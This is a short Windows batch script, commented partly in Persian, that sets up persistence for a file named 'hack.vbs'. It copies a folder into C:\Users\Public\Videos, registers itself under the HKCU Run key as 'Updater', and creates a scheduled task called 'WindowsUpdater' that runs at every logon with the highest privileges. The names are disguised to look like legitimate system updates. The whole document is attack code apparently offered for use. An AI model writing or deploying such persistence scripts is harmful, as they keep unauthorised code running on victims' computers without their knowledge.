@echo off
set payloadPath=C:\Users\Public\Videos\hack.vbs
set taskName=WindowsUpdater
set sourceFolder=C:\path\to\your\folder   :: Change this to your folder's path
set destinationFolder=C:\Users\Public\Videos

:: Copy the folder and its contents to the destination folder
xcopy "%sourceFolder%" "%destinationFolder%" /E /I /H /Y

:: اضافه کردن به استارت‌آپ (Registry)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "%~f0" /f

:: ایجاد Scheduled Task برای اجرای بات‌فایل پس از هر ری‌استارت
schtasks /create /sc onlogon /tn %taskName% /tr "%~f0" /f /rl highest
